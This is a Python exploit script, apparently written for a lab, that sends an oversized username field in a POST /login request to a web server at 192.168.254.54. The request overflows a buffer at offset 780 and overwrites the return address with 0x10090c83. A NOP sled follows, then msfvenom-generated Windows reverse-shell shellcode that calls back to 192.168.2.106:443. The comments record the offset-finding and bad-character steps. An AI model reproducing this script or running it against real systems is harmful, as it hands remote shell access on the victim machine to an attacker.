#/usr/bin/python/

import socket

# /usr/bin/msf-pattern_offset -l 1000 -q 42306142
# Exact match at offset 780
# bad chars:  \x00\x0a\x0d\x25\x26\x2b\x3d
# dados = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af>
# 0x10090c83
# windows/shell_reverse_tcp -b "bad_chars" -f c
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.106 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c

shell = ("\xbf\xd4\xe1\xb0\xc6\xdb\xc1\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x7d\x12\x83\xed\xfc\x03\xa9\xef\x52\x33\xad\x18\x10"
"\xbc\x4d\xd9\x75\x34\xa8\xe8\xb5\x22\xb9\x5b\x06\x20\xef\x57"
"\xed\x64\x1b\xe3\x83\xa0\x2c\x44\x29\x97\x03\x55\x02\xeb\x02"
"\xd5\x59\x38\xe4\xe4\x91\x4d\xe5\x21\xcf\xbc\xb7\xfa\x9b\x13"
"\x27\x8e\xd6\xaf\xcc\xdc\xf7\xb7\x31\x94\xf6\x96\xe4\xae\xa0"
"\x38\x07\x62\xd9\x70\x1f\x67\xe4\xcb\x94\x53\x92\xcd\x7c\xaa"
"\x5b\x61\x41\x02\xae\x7b\x86\xa5\x51\x0e\xfe\xd5\xec\x09\xc5"
"\xa4\x2a\x9f\xdd\x0f\xb8\x07\x39\xb1\x6d\xd1\xca\xbd\xda\x95"
"\x94\xa1\xdd\x7a\xaf\xde\x56\x7d\x7f\x57\x2c\x5a\x5b\x33\xf6"
"\xc3\xfa\x99\x59\xfb\x1c\x42\x05\x59\x57\x6f\x52\xd0\x3a\xf8"
"\x97\xd9\xc4\xf8\xbf\x6a\xb7\xca\x60\xc1\x5f\x67\xe8\xcf\x98"
"\x88\xc3\xa8\x36\x77\xec\xc8\x1f\xbc\xb8\x98\x37\x15\xc1\x72"
"\xc7\x9a\x14\xd4\x97\x34\xc7\x95\x47\xf5\xb7\x7d\x8d\xfa\xe8"
"\x9e\xae\xd0\x80\x35\x55\xb3\x6e\x61\x24\x41\x07\x70\xc6\x44"
"\x6c\xfd\x20\x2c\x82\xa8\xfb\xd9\x3b\xf1\x77\x7b\xc3\x2f\xf2"
"\xbb\x4f\xdc\x03\x75\xb8\xa9\x17\xe2\x48\xe4\x45\xa5\x57\xd2"
"\xe1\x29\xc5\xb9\xf1\x24\xf6\x15\xa6\x61\xc8\x6f\x22\x9c\x73"
"\xc6\x50\x5d\xe5\x21\xd0\xba\xd6\xac\xd9\x4f\x62\x8b\xc9\x89"
"\x6b\x97\xbd\x45\x3a\x41\x6b\x20\x94\x23\xc5\xfa\x4b\xea\x81"
"\x7b\xa0\x2d\xd7\x83\xed\xdb\x37\x35\x58\x9a\x48\xfa\x0c\x2a"
"\x31\xe6\xac\xd5\xe8\xa2\xcd\x37\x38\xdf\x65\xee\xa9\x62\xe8"
"\x11\x04\xa0\x15\x92\xac\x59\xe2\x8a\xc5\x5c\xae\x0c\x36\x2d"
"\xbf\xf8\x38\x82\xc0\x28")

#dados = "A" * 780 + "\x83\x0c\x09\x10"	 + "C" * (1000 - 780)

dados = "A" * 780 + "\x83\x0c\x09\x10"	 + "\x90" * 16 + shell

tam = len(dados) + 20

request="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.254.54\r\n"
request+="Content-Length: "+str(tam)+"\r\n"
request+="Cache-Control: max-age=0\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="Origin: http://192.168.254.54\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
request+="Referer: http://192.168.254.54/login\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Accept-Language: en-US,en;q=0.9\r\n"
request+="Connection: close\r\n"
request+="\r\n"
request+="username="+dados+"&password=A"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.254.54", 80))
s.send(request)
#s.recv(1024)
